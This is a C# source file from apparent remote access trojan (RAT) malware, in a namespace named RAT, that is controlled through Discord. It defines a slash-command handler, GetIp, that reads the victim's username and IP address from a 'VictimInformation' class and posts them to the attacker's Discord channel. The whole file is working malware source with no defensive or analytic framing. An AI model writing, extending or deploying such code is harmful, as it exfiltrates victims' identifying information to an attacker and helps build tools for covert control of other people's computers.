using Discord;
using Discord.WebSocket;

namespace RAT;

internal partial class Commands
{
    internal static async Task GetIp(SocketSlashCommand cmdSket)
    {
        try
        {
            EmbedBuilder e = new()
            {
                Description = $"{VictimInformation.Shared.UserName}: {VictimInformation.Shared.ip}"
            };
            await cmdSket.RespondAsync(embed: e.Build());
        }
        catch
        {
            EmbedBuilder e = new()
            {
                Description = $"{VictimInformation.Shared.UserName}: {VictimInformation.Shared.ip}"
            };
            await cmdSket.Channel.SendMessageAsync(embed: e.Build());
        }
    }
}